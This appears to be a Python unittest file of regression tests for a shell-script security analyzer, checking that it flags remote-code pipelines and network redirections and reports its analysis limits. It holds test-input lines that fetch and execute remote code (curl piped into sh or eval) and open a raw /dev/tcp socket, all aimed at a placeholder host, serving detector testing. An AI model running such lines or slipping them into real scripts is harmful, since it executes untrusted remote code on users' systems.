"""Counterexamples to shell lexer and executable-operand inference (FC-01/02/03/08/09)."""
from __future__ import annotations

import unittest

from falsicore.shell_syntax import analyze


class ShellAssuranceRegressions(unittest.TestCase):
    def test_nested_process_substitution_does_not_raise(self):
        for script in ('eval sh <(curl https://example.test/payload)',
                       'eval source <(curl https://example.test/payload)',
                       'sh <(curl https://example.test/payload)'):
            with self.subTest(script=script):
                result = analyze(script)
                self.assertIn("patterns", result)
                self.assertIn("limitations", result)
        # Dynamic nested code that cannot be tracked must not be cleared.
        self.assertIn("EXPANSION_NOT_RESOLVED",
                      analyze('eval sh <(curl https://example.test/payload)')["limitations"])

    def test_taint_of_noncode_arguments_is_not_executable(self):
        harmless = analyze('sh -c "echo literal" "$(curl https://example.test/data)"')
        self.assertNotIn("REMOTE_SCRIPT_PIPELINE", harmless["patterns"])
        executable = analyze('sh -c "$(curl https://example.test/code)"')
        self.assertIn("REMOTE_SCRIPT_PIPELINE", executable["patterns"])

    def test_here_string_is_data_not_network_connection(self):
        self.assertNotIn("NETWORK_REDIRECTION", analyze("cat <<< /dev/tcp/example.test/80")["patterns"])
        self.assertIn("NETWORK_REDIRECTION", analyze("exec 3<>/dev/tcp/example.test/80")["patterns"])

    def test_parameter_expansion_command_is_not_silently_cleared(self):
        for script in ('echo ${x:-$(curl https://example.test/code)}',
                       'echo "${x:-$(base64 -d /tmp/x)}"'):
            with self.subTest(script=script):
                self.assertIn("PARAMETER_EXPANSION_NOT_ANALYZED", analyze(script)["limitations"])

    def test_deep_nested_quote_and_brace_produce_bounded_gap(self):
        text = 'echo "' + '${x:-' * 600 + 'payload' + '}' * 600 + '"'
        self.assertIn("NESTING_LIMIT", analyze(text)["limitations"])


if __name__ == "__main__":
    unittest.main()
